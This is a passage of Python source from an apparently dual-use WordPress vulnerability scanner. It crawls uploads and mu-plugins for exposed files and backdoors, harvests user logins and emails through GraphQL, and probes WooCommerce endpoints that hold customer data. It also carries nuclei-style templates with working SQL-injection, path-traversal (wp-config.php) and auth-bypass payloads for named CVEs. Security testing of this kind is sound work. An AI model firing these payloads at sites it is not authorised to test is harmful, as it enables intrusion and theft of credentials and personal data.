        if not isinstance(res, tuple) or not res[0]:
            continue
        p_url, p_rel, p_html = res
        findings.append({"type": "plugin_dir_listing", "url": p_url, "path": p_rel,
                          "description": f"Plugin upload dir exposed: {p_rel}"})
        findings.extend(_parse_dir_listing(p_html, p_rel, base))
        warn(f"Plugin upload dir listing: {p_url}")

    # ── 4. Sensitive filename probes in uploads root ──────────────────────────
    probes = []
    for name in UPLOAD_SENSITIVE_NAMES:
        for ext in (".sql", ".zip", ".tar.gz", ".bak", ".xml", ".csv", ".json"):
            probes.append(f"{up_root}{name}{ext}")
    # WordPress-specific exports
    probes += [
        f"{up_root}export.xml", f"{up_root}wordpress.xml", f"{up_root}wp-export.xml",
        f"{up_root}users.csv",  f"{up_root}customers.csv", f"{up_root}subscribers.csv",
        f"{up_root}orders.csv", f"{up_root}emails.csv",    f"{up_root}.htaccess",
        f"{up_root}woocommerce_uploads/",  # also probe as direct file
    ]
    file_tasks = await asyncio.gather(*[probe_file(p) for p in probes],
                                       return_exceptions=True)
    for res in file_tasks:
        if isinstance(res, dict) and res:
            findings.append(res)
            warn(f"UPLOAD FILE EXPOSED: {res['url']}  ({res.get('size','?')} bytes)")

    result.upload_findings = findings
    total_sensitive = sum(1 for f in findings if f["type"] in
                          ("sensitive_upload_file", "listed_sensitive_file"))
    ok(f"Upload crawler: {len(findings)} findings, {total_sensitive} sensitive files")
    return findings


async def detect_dropin_files(session, result):
    """
    Check for WordPress drop-in PHP files in wp-content/.
    db.php / object-cache.php / advanced-cache.php execute with near-zero
    restrictions and are the preferred location for persistent backdoors.
    A 200 on any of these is a high-severity finding.
    """
    base     = result.target_url
    findings = []
    sem      = asyncio.Semaphore(5)

    async def probe(path):
        async with sem:
            url = urljoin(base, path)
            try:
                async with session.get(url, headers=hdr(), timeout=8,
                                       allow_redirects=False) as r:
                    if r.status in (200, 403):
                        snippet = ""
                        if r.status == 200:
                            text = await r.text(errors="replace")
                            snippet = text[:200].replace("\n", " ")
                        return {"path": path, "url": url, "status": r.status,
                                "snippet": snippet}
            except Exception:
                pass
        return None

    tasks = await asyncio.gather(*[probe(p) for p in WP_DROPIN_FILES],
                                  return_exceptions=True)
    for res in tasks:
        if not isinstance(res, dict) or not res:
            continue
        findings.append(res)
        if res["status"] == 200:
            warn(f"DROP-IN ACCESSIBLE (potential backdoor): {res['url']}")
            if res["snippet"]:
                info(f"  Preview: {res['snippet'][:120]}")
        else:
            info(f"Drop-in exists (403 protected): {res['path']}")

    result.dropin_findings = findings
    return findings


_MU_PLUGIN_WORDLIST = [
    # Common backdoor / malware filenames planted in mu-plugins
    "plugin.php", "index.php", "wp-content.php", "wp-includes.php",
    "functions.php", "loader.php", "init.php", "bootstrap.php",
    "mu-plugin.php", "must-use-plugin.php", "class-plugin.php",
    "cache.php", "object-cache.php", "db.php", "health.php",
    "update.php", "upgrade.php", "cron.php", "heartbeat.php",
    "akismet.php", "jetpack.php", "woocommerce.php", "elementor.php",
    "maintenance.php", "backdoor.php", "shell.php", "c99.php",
    # Autoloaders
    "autoload.php", "class-autoload.php", "wp-autoload.php",
]

async def scan_mu_plugins(session, result):
    """
    Scan wp-content/mu-plugins/ — Must-Use plugins load automatically before
    normal plugins and without activation.  Attackers abuse them for
    persistent hidden backdoors that survive plugin manager cleanup.

    If directory listing is blocked (403) we fall back to wordlist probing
    so common filenames are still caught.
    """
    base     = result.target_url
    mu_url   = urljoin(base, "wp-content/mu-plugins/")
    findings = []

    try:
        async with session.get(mu_url, headers=hdr(), timeout=10,
                               allow_redirects=False) as r:
            if r.status == 200:
                text = await r.text(errors="replace")
                if any(sig in text for sig in
                       ("Index of", "Parent Directory", "Directory listing")):
                    findings.append({"type": "dir_listing", "url": mu_url})
                    warn(f"mu-plugins/ directory listing OPEN: {mu_url}")
                    # Extract PHP files from listing
                    links = re.findall(r'href=["\']([^"\'?#]+\.php)["\']', text, re.I)
                    for link in links:
                        file_url = urljoin(mu_url, link)
                        findings.append({"type": "mu_plugin_file", "url": file_url, "name": link})
                        warn(f"  mu-plugin: {link}  ({file_url})")
                    result.mu_plugin_findings = findings
                    return findings
            elif r.status == 403:
                findings.append({"type": "dir_exists_protected", "url": mu_url})
                info("mu-plugins/ exists (403 — not directory-browsable) — probing wordlist")
    except Exception:
        pass

    # Wordlist probe — runs whether directory was 403 or we got no listing
    sem = asyncio.Semaphore(6)

    async def _probe_mu(slug):
        async with sem:
            url = urljoin(mu_url, slug)
            try:
                async with session.get(url, headers=hdr(), timeout=8,
                                       allow_redirects=False) as r:
                    if r.status == 200:
                        snippet = ""
                        try:
                            t = await r.text(errors="replace")
                            snippet = t[:120].replace("\n", " ")
                        except Exception:
                            pass
                        return {"type": "mu_plugin_file", "url": url, "name": slug,
                                "snippet": snippet}
            except Exception:
                pass
        return None

    probe_results = await asyncio.gather(*[_probe_mu(s) for s in _MU_PLUGIN_WORDLIST],
                                         return_exceptions=True)
    for pr in probe_results:
        if isinstance(pr, dict):
            findings.append(pr)
            warn(f"mu-plugin file accessible: {pr['name']}  ({pr['url']})")
            if pr.get("snippet"):
                info(f"  Preview: {pr['snippet'][:80]}")

    result.mu_plugin_findings = findings
    return findings


async def detect_graphql(session, result):
    """
    Detect WPGraphQL (and similar) endpoints and test for introspection.
    An open introspection query leaks the entire data schema — post types,
    custom fields, user fields — even content that isn't public via REST.
    If introspection is open, also query for users (databaseId, login, email)
    which bypasses REST /users auth restrictions.
    """
    base      = result.target_url
    endpoints = ["graphql", "wp-json/graphql", "api/graphql", "graphql/v1"]
    introspection = '{"query":"{ __schema { types { name kind } } }"}'

    for ep in endpoints:
        url = urljoin(base, ep)
        try:
            async with session.post(url, data=introspection,
                                    headers=hdr({"Content-Type": "application/json"}),
                                    timeout=10, allow_redirects=False) as r:
                if r.status == 200:
                    text = await r.text(errors="replace")
                    if "__schema" in text or '"types"' in text:
                        result.graphql_endpoint = url
                        types = re.findall(r'"name"\s*:\s*"([^"_][^"]+)"', text)
                        result.graphql_types = sorted(set(types))[:60]
                        warn(f"GraphQL introspection OPEN: {url}  "
                             f"({len(result.graphql_types)} types exposed)")

                        # ── Follow-up: query real user data ───────────────
                        user_query = '{"query":"{ users { nodes { databaseId login email } } }"}'
                        try:
                            async with session.post(
                                url, data=user_query,
                                headers=hdr({"Content-Type": "application/json"}),
                                timeout=12, allow_redirects=False
                            ) as ru:
                                if ru.status == 200:
                                    utext = await ru.text(errors="replace")
                                    if '"nodes"' in utext and '"login"' in utext:
                                        logins = re.findall(r'"login"\s*:\s*"([^"]+)"', utext)
                                        emails = re.findall(r'"email"\s*:\s*"([^"]+)"', utext)
                                        ids    = re.findall(r'"databaseId"\s*:\s*(\d+)', utext)
                                        warn(f"GraphQL user query leaked {len(logins)} account(s)!")
                                        seen = {u.slug for u in result.users}
                                        for i, login in enumerate(logins):
                                            if login not in seen:
                                                seen.add(login)
                                                uid = int(ids[i]) if i < len(ids) else 0
                                                email = emails[i] if i < len(emails) else ""
                                                result.users.append(UserEntry(
                                                    id=uid, name=login,
                                                    slug=login, detected_by="graphql"
                                                ))
                                                ok(f"  GraphQL user: {login}  {f'<{email}>' if email else ''}")
                        except Exception:
                            pass

                        return url, result.graphql_types
        except Exception:
            pass

    return None, []


async def check_exposed_plugins_api(session, result):
    """
    Probe /wp-json/wp/v2/plugins — requires admin by default but is
    sometimes misconfigured or exposed via JWT / cookie auth residue.
    Also probes /wp-json/wp/v2/themes for active theme disclosure,
    and /wp-json/wc/v3/ for WooCommerce customer/order data leaks.
    """
    base = result.target_url
    for endpoint, label in [
        ("wp-json/wp/v2/plugins", "REST plugins list"),
        ("wp-json/wp/v2/themes",  "REST themes list"),
    ]:
        url = urljoin(base, endpoint)
        try:
            async with session.get(url, headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if isinstance(data, list) and data:
                        warn(f"REST {label} EXPOSED ({len(data)} items): {url}")
                        for item in data[:5]:
                            name = item.get("plugin","") or item.get("stylesheet","") or "?"
                            ver  = item.get("version","?")
                            info(f"  {label}: {name}  v{ver}")
        except Exception:
            pass

    # ── WooCommerce REST API check ────────────────────────────────────────────
    for wc_endpoint, wc_label in [
        ("wp-json/wc/v3/orders",    "WooCommerce orders (customer PII!)"),
        ("wp-json/wc/v3/customers", "WooCommerce customers (emails/addresses)"),
        ("wp-json/wc/v3/products",  "WooCommerce products"),
    ]:
        wc_url = urljoin(base, wc_endpoint)
        try:
            async with session.get(wc_url, headers=hdr(), timeout=10) as r:
                if r.status == 200:
                    data = await r.json(content_type=None)
                    if isinstance(data, list):
                        warn(f"WooCommerce {wc_label} EXPOSED ({len(data)} items): {wc_url}")
                    elif isinstance(data, dict) and data.get("code") != "woocommerce_rest_cannot_view":
                        # Namespace exists even if empty
                        info(f"WooCommerce REST namespace accessible: {wc_url}")
                elif r.status in (401, 403):
                    # Namespace exists but auth required — still worth flagging
                    info(f"WooCommerce REST {wc_label.split('(')[0].strip()} requires auth: {wc_url}")
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2.5 — DEEP RECON (--deep-recon)
# ─────────────────────────────────────────────────────────────────────────────
async def analyze_js_files(session, result, html):
    """Extract all enqueued JS URLs, fetch each, scan for secrets & endpoints."""
    info("Analyzing JavaScript files...")
    js_urls = list(set(re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html, re.I)))
    # Normalize to absolute URLs
    abs_urls = []
    for u in js_urls:
        if u.startswith("http"):
            abs_urls.append(u)
        elif u.startswith("//"):
            abs_urls.append("https:" + u)
        elif u.startswith("/"):
            parsed = urlparse(result.target_url)
            abs_urls.append(f"{parsed.scheme}://{parsed.netloc}{u}")
        else:
            abs_urls.append(urljoin(result.target_url, u))

    findings = []
    sem = asyncio.Semaphore(5)

    async def scan_js(js_url):
        async with sem:
            try:
                async with session.get(js_url, headers=hdr(), timeout=15) as r:
                    if r.status != 200:
                        return
                    text = await r.text(errors="replace")
                    for ftype, pattern in JS_SECRET_PATTERNS.items():
                        for match in pattern.findall(text):
                            value = match if isinstance(match, str) else match
                            # Skip obvious false positives
                            if len(value) < 4 or value in ("true","false","null","undefined"):
                                continue
                            findings.append(JsFinding(js_url=js_url, finding_type=ftype, value=value[:120]))
            except Exception:
                pass

    await asyncio.gather(*[scan_js(u) for u in abs_urls[:30]], return_exceptions=True)
    result.js_findings = findings
    ok(f"JS analysis: {len(abs_urls)} files scanned, {len(findings)} findings")

async def parse_robots_sitemap(session, result):
    """Parse robots.txt for Disallow paths and sitemap.xml for URLs."""
    base = result.target_url

    # robots.txt
    try:
        async with session.get(urljoin(base, "robots.txt"), headers=hdr(), timeout=12) as r:
            if r.status == 200:
                text = await r.text(errors="replace")
                for line in text.splitlines():
                    line = line.strip()
                    if line.lower().startswith("disallow:"):
                        path = line.split(":",1)[1].strip()
                        if path and path != "/":
                            result.robots_paths.append(path)
                ok(f"robots.txt: {len(result.robots_paths)} Disallow paths found")
    except Exception:
        pass

    # sitemap.xml
    sitemap_urls_to_try = ["sitemap.xml", "sitemap_index.xml", "wp-sitemap.xml"]
    for sm in sitemap_urls_to_try:
        try:
            async with session.get(urljoin(base, sm), headers=hdr(), timeout=12) as r:
                if r.status == 200:
                    text = await r.text(errors="replace")
                    urls = re.findall(r'<loc>([^<]+)</loc>', text)
                    result.sitemap_urls.extend(urls[:100])
                    ok(f"{sm}: {len(urls)} URLs extracted")
                    break
        except Exception:
            pass

async def discover_rest_endpoints(session, result):
    """Enumerate all WP REST API routes and flag unauthenticated ones."""
    info("Discovering REST API endpoints...")
    try:
        async with session.get(urljoin(result.target_url, "wp-json/"), headers=hdr(), timeout=15) as r:
            if r.status != 200:
                info("REST API root not accessible (may be disabled)")
                return
            data = await r.json(content_type=None)
            routes = data.get("routes", {})

            sem = asyncio.Semaphore(8)

            async def probe_route(route, info_dict):
                async with sem:
                    url = urljoin(result.target_url, f"wp-json{route}")
                    methods = list((info_dict.get("methods") or {}).keys()) if isinstance(info_dict, dict) else ["GET"]
                    auth_req = True
                    preview  = ""
                    try:
                        async with session.get(url, headers=hdr(), timeout=10) as rr:
                            if rr.status == 200:
                                auth_req = False
                                text = await rr.text(errors="replace")
                                preview = text[:80].replace("\n","")
                            elif rr.status in (401, 403):
                                auth_req = True
                    except Exception:
                        pass
                    return RestEndpoint(route=route, methods=methods,
                                        auth_required=auth_req, response_preview=preview)

            tasks = [probe_route(r, d) for r, d in routes.items()]
            endpoints = await asyncio.gather(*tasks, return_exceptions=True)
            result.rest_endpoints = [e for e in endpoints if isinstance(e, RestEndpoint)]

            unauthed = [e for e in result.rest_endpoints if not e.auth_required]
            ok(f"REST API: {len(result.rest_endpoints)} routes, {len(unauthed)} accessible without auth")
    except Exception as ex:
        info(f"REST API discovery error: {ex}")

async def enumerate_subdomains(session, result):
    """Enumerate subdomains via crt.sh SSL certificate transparency."""
    domain = urlparse(result.target_url).netloc
    info(f"Subdomain enum via crt.sh for {domain}...")
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        async with session.get(url, headers=hdr(), timeout=25) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                seen = set()
                for entry in data:
                    for name in entry.get("name_value","").split("\n"):
                        name = name.strip().lstrip("*.")
                        if name and name not in seen and domain in name:
                            seen.add(name)
                            result.subdomains.append(name)
                ok(f"crt.sh: {len(result.subdomains)} subdomains found")
    except Exception as ex:
        info(f"crt.sh lookup failed: {ex}")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3 — CVE INTELLIGENCE + VERSION MATCHING
# ─────────────────────────────────────────────────────────────────────────────
DB_PATH   = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wphawk_cve_cache.db")
CACHE_TTL = 48 * 3600

async def init_db():
    db = await aiosqlite.connect(DB_PATH)
    await db.execute("""CREATE TABLE IF NOT EXISTS cve_cache (
        cache_key TEXT PRIMARY KEY, data TEXT, cached_at REAL)""")
    await db.commit()
    return db

async def get_cached(db, key):
    async with db.execute("SELECT data, cached_at FROM cve_cache WHERE cache_key=?", (key,)) as cur:
        row = await cur.fetchone()
    if row and time.time() - row[1] < CACHE_TTL:
        return json.loads(row[0])
    return None

async def store_cached(db, key, data):
    await db.execute("INSERT OR REPLACE INTO cve_cache VALUES (?,?,?)",
                     (key, json.dumps(data), time.time()))
    await db.commit()

def _make_cve(cve_id, cvss, desc, published, refs, exploit_available=False,
              edb_id="", edb_url="", source="", fixed_in=""):
    score = float(cvss) if cvss else 0.0
    return {
        "cve_id": cve_id, "cvss_score": score, "severity": cvss_to_severity(score),
        "description": (desc or "")[:300], "published": published or "",
        "references": refs or [], "exploit_available": exploit_available,
        "exploit_db_id": edb_id or "", "exploit_url": edb_url or "",
        "source": source, "fixed_in": fixed_in, "is_patched": False,
    }

async def _lookup_nvd(session, slug):
    cves = []
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=wordpress+{slug}&resultsPerPage=30"
    try:
        await asyncio.sleep(0.6)
        async with session.get(url, headers=hdr(), timeout=30) as r:
            if r.status != 200:
                return cves
            data = await r.json(content_type=None)
            for item in data.get("vulnerabilities", []):
                cve  = item.get("cve", {})
                cvid = cve.get("id","")
                cvss = 0.0
                for key in ("cvssMetricV31","cvssMetricV30","cvssMetricV2"):
                    arr = cve.get("metrics",{}).get(key,[])
                    if arr:
                        cvss = arr[0].get("cvssData",{}).get("baseScore", 0.0)
                        break
                desc = next((d["value"] for d in cve.get("descriptions",[]) if d.get("lang")=="en"), "")
                refs = [r2.get("url","") for r2 in cve.get("references",[])]
                if cvid and cvss > 0:
                    cves.append(_make_cve(cvid, cvss, desc, cve.get("published",""), refs, source="NVD"))
    except Exception:
        pass
    return cves

async def _lookup_github(session, slug):
    cves = []
    url = f"https://api.github.com/advisories?type=reviewed&per_page=50&query={slug}+wordpress"
    try:
        await asyncio.sleep(1.0)
        async with session.get(url, headers=hdr({"Accept":"application/vnd.github+json"}), timeout=20) as r:
            if r.status != 200:
                return cves
            for adv in await r.json(content_type=None):
                summary = adv.get("summary","")
                if slug.lower() not in summary.lower():
                    continue
                cvss_obj  = adv.get("cvss") or {}
                cvss      = cvss_obj.get("score", 5.0)
                cve_ids   = adv.get("cve_id") or []
                if isinstance(cve_ids, str):
                    cve_ids = [cve_ids]
                cve_id  = cve_ids[0] if cve_ids else adv.get("ghsa_id","")
                refs    = [r2.get("url","") for r2 in (adv.get("references") or [])]
                if cve_id:
                    cves.append(_make_cve(cve_id, cvss, summary, adv.get("published_at",""), refs, source="GitHub Advisory"))
    except Exception:
        pass
    return cves

async def _lookup_patchstack(session, slug):
    cves = []
    url = f"https://patchstack.com/database/wordpress/{slug}"
    try:
        async with session.get(url, headers=hdr(), timeout=20) as r:
            if r.status != 200:
                return cves
            html = await r.text(errors="replace")
            rows = re.findall(r'<tr[^>]*>(.*?)</tr>', html, re.S)
            for row in rows:
                cve_m   = re.search(r'CVE-(\d{4}-\d+)', row)
                cvss_m  = re.search(r'(\d+\.\d+)\s*/\s*10', row)
                fix_m   = re.search(r'(?:Fixed in|Patched in)\s*v?([\d.]+)', row, re.I)
                title_m = re.search(r'<td[^>]*>\s*([^<]{10,100}?)\s*</td>', row)
                if cve_m:
                    fixed_in = fix_m.group(1) if fix_m else ""
                    cves.append(_make_cve(
                        f"CVE-{cve_m.group(1)}", float(cvss_m.group(1)) if cvss_m else 5.0,
                        re.sub(r'<[^>]+>',"",title_m.group(1)).strip() if title_m else "",
                        "", [], source="Patchstack", fixed_in=fixed_in
                    ))
    except Exception:
        pass
    return cves

async def _lookup_exploitdb(session, slug):
    cves = []
    url = f"https://www.exploit-db.com/search?q=wordpress+{slug}&type=webapps&platform=php"
    try:
        async with session.get(url, headers=hdr({"Accept":"application/json,*/*"}), timeout=20) as r:
            if r.status != 200:
                return cves
            text = await r.text(errors="replace")
            edb_ids = re.findall(r'"id"\s*:\s*"?(\d+)"?', text)
            cve_ids = re.findall(r'(CVE-\d{4}-\d+)', text)
            titles  = re.findall(r'"title"\s*:\s*"([^"]+)"', text)
            for i, eid in enumerate(edb_ids[:10]):
                cve_id  = cve_ids[i] if i < len(cve_ids) else f"EDB-{eid}"
                title   = titles[i] if i < len(titles) else f"WordPress {slug} exploit"
                edb_url = f"https://www.exploit-db.com/exploits/{eid}"
                cves.append(_make_cve(cve_id, 7.5, title, "", [edb_url],
                                      exploit_available=True, edb_id=eid, edb_url=edb_url, source="Exploit-DB"))
    except Exception:
        pass
    return cves

def _merge_cves(lists):
    seen = {}
    for lst in lists:
        for c in lst:
            cid = c["cve_id"]
            if cid not in seen:
                seen[cid] = c
            else:
                if c.get("exploit_available"):
                    seen[cid]["exploit_available"] = True
                    if c.get("exploit_url"):
                        seen[cid]["exploit_url"] = c["exploit_url"]
                if c["cvss_score"] > seen[cid]["cvss_score"]:
                    seen[cid]["cvss_score"] = c["cvss_score"]
                    seen[cid]["severity"] = c["severity"]
                if c.get("fixed_in") and not seen[cid].get("fixed_in"):
                    seen[cid]["fixed_in"] = c["fixed_in"]
    return sorted(seen.values(), key=lambda x: x["cvss_score"], reverse=True)

# ─── WordPress.org API — latest version + outdated detection ─────────────────
async def _wporg_plugin_info(session, slug):
    try:
        url = f"https://api.wordpress.org/plugins/info/1.0/{slug}.json"
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data.get("version",""), data.get("last_updated","")
    except Exception:
        pass
    return "", ""

async def _wporg_theme_info(session, slug):
    try:
        url = f"https://api.wordpress.org/themes/info/1.1/?action=theme_information&request[slug]={slug}"
        async with session.get(url, headers=hdr(), timeout=12) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data.get("version",""), data.get("last_updated","")
    except Exception:
        pass
    return "", ""

async def check_plugin_versions(session, result):
    """Compare detected plugin/theme versions with WP.org latest — flag outdated."""
    info("Checking plugin/theme versions against WordPress.org...")
    sem = asyncio.Semaphore(10)

    async def check_one(entry):
        async with sem:
            if entry.asset_type == "plugin":
                latest, updated = await _wporg_plugin_info(session, entry.slug)
            else:
                latest, updated = await _wporg_theme_info(session, entry.slug)
            if latest:
                entry.latest_version = latest
                entry.last_updated   = updated
                if entry.version and version_lt(entry.version, latest):
                    entry.is_outdated = True

    await asyncio.gather(*[check_one(e) for e in result.plugins + result.themes], return_exceptions=True)
    result.outdated_plugins = [
        e for e in result.plugins + result.themes if e.is_outdated
    ]
    ok(f"Outdated plugins/themes: {len(result.outdated_plugins)}")

async def enrich_with_cves(session, result, db, refresh_cache=False):
    """Fetch CVEs for all plugins/themes/core and apply version-aware filtering."""
    info("CVE intelligence: NVD + GitHub + Patchstack + Exploit-DB...")

    async def fetch_slug(slug, asset_type, detected_version):
        key = f"{asset_type}:{slug}"
        if not refresh_cache:
            cached = await get_cached(db, key)
            if cached is not None:
                return slug, asset_type, detected_version, cached
        info(f"CVE lookup: {slug}")
        results = await asyncio.gather(
            _lookup_nvd(session, slug),
            _lookup_github(session, slug),
            _lookup_patchstack(session, slug),
            _lookup_exploitdb(session, slug),
            return_exceptions=True
        )
        merged = _merge_cves([r for r in results if isinstance(r, list)])
        await store_cached(db, key, merged)
        return slug, asset_type, detected_version, merged

    tasks = (
        [fetch_slug(p.slug, "plugin", p.version) for p in result.plugins] +
        [fetch_slug(t.slug, "theme", t.version) for t in result.themes]
    )
    if result.wp_version:
        tasks.append(fetch_slug(f"wordpress-{result.wp_version}", "core", result.wp_version))

    all_res = await asyncio.gather(*tasks, return_exceptions=True)
    total_cves = 0
    total_vuln = 0

    for item in all_res:
        if isinstance(item, Exception) or item is None:
            continue
        slug, asset_type, detected_ver, raw_cves = item

        cve_objs = []
        vuln_objs = []
        for c in raw_cves:
            # Version-aware patching check
            fixed_in = c.get("fixed_in","")
            if fixed_in and detected_ver:
                c["is_patched"] = version_gte(detected_ver, fixed_in)
            else:
                c["is_patched"] = False
            obj = CVEEntry(**c)
            cve_objs.append(obj)
            if not obj.is_patched:
                vuln_objs.append(obj)
            total_cves += 1
            if not obj.is_patched:
                total_vuln += 1

        if asset_type == "plugin":
            for p in result.plugins:
                if p.slug == slug:
                    p.cves = cve_objs
                    p.vulnerable_cves = vuln_objs
        elif asset_type == "theme":
            for t in result.themes:
                if t.slug == slug:
                    t.cves = cve_objs
                    t.vulnerable_cves = vuln_objs
        else:
            result.wp_core_cves = vuln_objs  # core: only show unpatched

    ok(f"CVE total: {total_cves} found, {total_vuln} unpatched (version-filtered)")

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3.5 — LOCAL CVE TEMPLATE ENGINE  (nuclei-style)
# ─────────────────────────────────────────────────────────────────────────────
TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cve")
WORDLISTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlists")

# ── Built-in CVE templates ────────────────────────────────────────────────────
# Each dict mirrors a nuclei template: id / info / target / http
# path tokens:  {{BaseURL}}  {{PluginURL}}  {{ThemeURL}}
BUILTIN_TEMPLATES = [
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-27956",
        "info": {
            "name": "ValvePress Automatic < 3.92.1 — Unauthenticated SQLi (CVSS 9.9)",
            "severity": "critical", "cvss_score": 9.9,
            "description": "Unauthenticated SQL injection via the `q` parameter in csv.php allows full DB read/write/exec.",
            "tags": ["sqli", "unauthenticated", "wp-automatic"],
        },
        "target": {"type": "plugin", "slug": "wp-automatic", "fixed_in": "3.92.1"},
        "http": [{
            "method": "POST",
            "path": "{{PluginURL}}/csv.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "q=SELECT+SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl",    "dsl": "duration >= 4.5"},
                {"type": "status", "status": [200], "negative": False},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-1071",
        "info": {
            "name": "Ultimate Member < 2.8.3 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "Unsanitised `sorting` parameter in um_get_members AJAX action allows SLEEP-based time injection.",
            "tags": ["sqli", "unauthenticated", "ultimate-member"],
        },
        "target": {"type": "plugin", "slug": "ultimate-member", "fixed_in": "2.8.3"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=um_get_members&nonce=invalid&directory_id=1&sorting=user_login%20AND%20SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2024-2879",
        "info": {
            "name": "LayerSlider < 7.10.1 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "SQL injection via `id` param in ls_get_popup_markup AJAX action. No nonce validated.",
            "tags": ["sqli", "unauthenticated", "layerslider"],
        },
        "target": {"type": "plugin", "slug": "LayerSlider", "fixed_in": "7.10.1"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=ls_get_popup_markup&id=1%20AND%20SLEEP(5)--+-",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2022-0739",
        "info": {
            "name": "BookingPress < 1.0.11 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "No nonce validation in bookingpress_get_service_prices AJAX. total_service injectable.",
            "tags": ["sqli", "unauthenticated", "bookingpress"],
        },
        "target": {"type": "plugin", "slug": "bookingpress-appointment-booking", "fixed_in": "1.0.11"},
        "http": [{
            "method": "POST",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "action=bookingpress_get_service_prices&total_service=1%20AND%20SLEEP(5)--+-&step_number=1&wps_service_id=1",
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-1119",
        "info": {
            "name": "WP Fastest Cache < 1.2.2 — Unauthenticated SQLi (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "username cookie value injected unsanitised into SQL query during cache lookup.",
            "tags": ["sqli", "unauthenticated", "wp-fastest-cache"],
        },
        "target": {"type": "plugin", "slug": "wp-fastest-cache", "fixed_in": "1.2.2"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/",
            "headers": {"Cookie": "username=admin'+AND+SLEEP(5)--+-", "User-Agent": "Mozilla/5.0"},
            "timeout": 12,
            "matchers_condition": "or",
            "matchers": [
                {"type": "dsl", "dsl": "duration >= 4.5"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2020-11738",
        "info": {
            "name": "Duplicator < 1.3.28 — Unauthenticated File Download / Path Traversal",
            "severity": "high", "cvss_score": 7.5,
            "description": "Unauthenticated file download via duplicator_download AJAX — path traversal to wp-config.php.",
            "tags": ["lfi", "path-traversal", "unauthenticated", "duplicator"],
        },
        "target": {"type": "plugin", "slug": "duplicator", "fixed_in": "1.3.28"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fwp-config.php",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "word",   "words": ["DB_PASSWORD", "DB_NAME"], "condition": "or", "part": "body"},
                {"type": "status", "status": [200]},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-6553",
        "info": {
            "name": "Backup Migration < 1.3.8 — Unauthenticated RCE via Path Traversal (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "The Content-Dir header in backup-heart.php allows directory traversal and arbitrary PHP exec.",
            "tags": ["rce", "unauthenticated", "backup-migration"],
        },
        "target": {"type": "plugin", "slug": "backup-migration", "fixed_in": "1.3.8"},
        "http": [{
            "method": "POST",
            "path": "{{PluginURL}}/includes/backup-heart.php",
            "headers": {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Dir": "../../../../../../tmp",
            },
            "body": "heartbeat_id=1&cancel=true",
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["cancel", "heartbeat", ""], "condition": "or", "part": "body",
                 "negative": True},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
        "id": "CVE-2023-28121",
        "info": {
            "name": "WooCommerce Payments < 5.6.2 — Unauthenticated Privilege Escalation (CVSS 9.8)",
            "severity": "critical", "cvss_score": 9.8,
            "description": "X-WC-Webhook-Delivery-ID header allows arbitrary user impersonation including admin access.",
            "tags": ["auth-bypass", "unauthenticated", "woocommerce-payments"],
        },
        "target": {"type": "plugin", "slug": "woocommerce-payments", "fixed_in": "5.6.2"},
        "http": [{
            "method": "GET",
            "path": "{{BaseURL}}/wp-json/wc/v3/system_status",
            "headers": {"X-WC-Webhook-Delivery-ID": "1", "X-Wcpay-Platform-Checkout-User": "1"},
            "timeout": 10,
            "matchers_condition": "and",
            "matchers": [
                {"type": "status", "status": [200]},
                {"type": "word",   "words": ["environment", "database", "active_plugins"], "condition": "or", "part": "body"},
            ],
        }],
    },
    # ─────────────────────────────────────────────────────
    {
